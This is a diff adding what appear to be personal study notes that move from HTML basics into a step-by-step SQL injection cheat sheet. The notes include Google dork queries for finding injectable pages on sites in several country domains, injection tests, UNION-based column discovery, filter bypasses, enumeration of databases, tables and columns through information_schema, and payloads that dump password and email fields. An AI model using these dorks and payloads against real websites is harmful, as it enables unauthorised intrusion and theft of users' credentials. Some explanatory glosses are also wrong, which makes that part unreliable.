@@ -1,0 +1,170 @@
+HTML :
+	<tag>
+		1 -> <tag></tag> 
+		2 -> <tag />
+		
+		<p> </p>
+		
+		Clean Code:
+		<p>
+			<b>Hi</b>
+		</p>
+		
+		minify -> unminify
+		
+		<car loop width="200" width="100" height='200' />
+		<home color=red  price="100" loop="true" loop="false"></home>
+		
+		
+		Ctrl + F5
+		
+		Web Site Input:
+			1 - Query String (GET)
+			2 - Form -> GET  - POST - Upload File 
+			3 - JavaScript -> Ajax -> GET - POST - PUT - PATCH - DELETE
+			4 - Cookie - localStorage - sessionStorage
+			5 - HTTP Header - 
+		Url Encode :
+			%00 -> %FF -> hex 0 -> 255
+			%26
+
+		Client Validation By Passing :
+			1 - HTML attributs
+			2 - Javascript - jQuery - 
+		
+
+		SQL injection Attacks  :
+		
+			DataBase:	
+				File 
+					#1#ali#reza#09191212#
+				
+				MYSQL -> 
+					Username->
+				SQL (Query)
+					INSERT - 
+					UPDATE -
+					DELETE -
+					SELECT - 99%
+					
+					
+				1 - Input 
+				
+				2 -> 
+						inurl:"news.php?id=" site:ir
+						inurl:"news.php?pid=" site:ir
+						inurl:"news.php?nid=" site:ir
+						inurl:"news.php?n=" site:il
+						inurl:"pro.php?id=" site:uk
+						
+				3 -> Test Bug ?
+						Mysql Comment :
+							1 -> #
+							2 -> --+
+							3 -> /* */
+							4 -> /*! */ C Style Comment
+						
+						
+						SELECT * FROM users WHERE id = [AttackCommand]
+						SELECT * FROM users WHERE id = ''[AttackCommand] #'
+						SELECT * FROM users WHERE id = ""[AttackCommand] #"
+						SELECT * FROM users WHERE id = ()[AttackCommand]#)
+						SELECT * FROM users WHERE id = (())[AttackCommand]#))
+						SELECT * FROM users WHERE id = ("")[AttackCommand]#")
+						SELECT * FROM users WHERE id = ('')[AttackCommand]#')
+							
+							1-> error
+									Query : select ...
+									mysqli_ 
+									mysql_
+									
+						    2->	data not load 
+									?id=1 -> data load 
+									?id=1' -> data  not load 
+							
+					Method Union:	
+					
+						SELECT * FROM user WHERE id = 1 UNION SELECT 1,2,3 FROM users	
+						SELECT * FROM user WHERE id = 1 UNION ALL SELECT 1,2,3 FROM users	
+
+						1 -> Find Number Of Columns
+							
+							1-> order by N
+								1-> order by 100
+								2-> order by 50
+								3-> order by 25
+								
+							2-> group by N
+							
+							
+							 
+						2 - Create Query
+								0xe -> 
+								UNION SELECT 1,2,N 
+								UNION SELECT .1,.2,N 
+								UNION SELECT 0.1,0.2,N 
+								UNION ALL SELECT 1,2,N 
+								UNION SELECT -1,-2,N 
+								UNION SELECT (1),(2),N 
+								UNION SELECT NULL,NULL,N 
+								UNION SELECT 'A','B',N 
+								UNION SELECT 0x41,0x42,N 
+							
+							
+								1-> show inject 
+								2->
+									1->id=-1
+									2->id=9999999
+									3->id=1+and+1=0
+						3 -
+								database() -> current database name
+								user() -> current database name
+								version() -> current database name
+						
+						4 -> Get All DataBase List
+								
+								UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA 
+								UNION SELECT 1,convert(SCHEMA_NAME+using+latin1),3 FROM information_schema.SCHEMATA 
+
+									ByPass-> 
+											convert(SCHEMA_NAME+using+latin1)
+									
+								UNION SELECT 1,count(SCHEMA_NAME),3 FROM information_schema.SCHEMATA
+								
+								LIMIT N,M
+								
+								UNION SELECT 1,group_concat(SCHEMA_NAME),3 FROM information_schema.SCHEMATA 
+								UNION SELECT 1,group_concat(convert(SCHEMA_NAME+using+latin1)),3 FROM information_schema.SCHEMATA 
+								UNION SELECT 1,convert(SCHEMA_NAME+using+latin1),3 FROM information_schema.SCHEMATA LIMIT 0,1
+								UNION SELECT 1,convert(SCHEMA_NAME+using+latin1),3 FROM information_schema.SCHEMATA LIMIT 1,1
+								UNION SELECT 1,convert(SCHEMA_NAME+using+latin1),3 FROM information_schema.SCHEMATA LIMIT 2,1
+								UNION SELECT 1,convert(SCHEMA_NAME+using+latin1),3 FROM information_schema.SCHEMATA LIMIT 3,1
+						5 -> Get All Table Names
+								Union SELECT 1,TABLE_NAME,3 FROM information_schema.tables WHERE TABLE_SCHEMA = 'ALI'
+								Union SELECT 1,TABLE_NAME,3 FROM information_schema.tables WHERE TABLE_SCHEMA = database()
+								Union SELECT 1,TABLE_NAME,3 FROM information_schema.tables WHERE TABLE_SCHEMA = 0x616c69
+								Union SELECT 1,count(TABLE_NAME),3 FROM information_schema.tables WHERE TABLE_SCHEMA = database()
+						
+						6 -> Get Columns of Table
+							Union SELECT 1,COLUMN_NAME,3 FROM information_schema.Columns WHERE TABLE_NAME = 'users'
+						
+						7 -> Get Data (Dump)
+							Union SELECT password FROM users
+							Union SELECT password FROM ali.users
+							concat(user_password,':',user_email)
+							concat(user_password,0x3a,user_email)
+							
+						
+				
+				
+				
+				
+				
+				
+				pic_badan_jolo
+				
+				
+				
+				
+				
+		
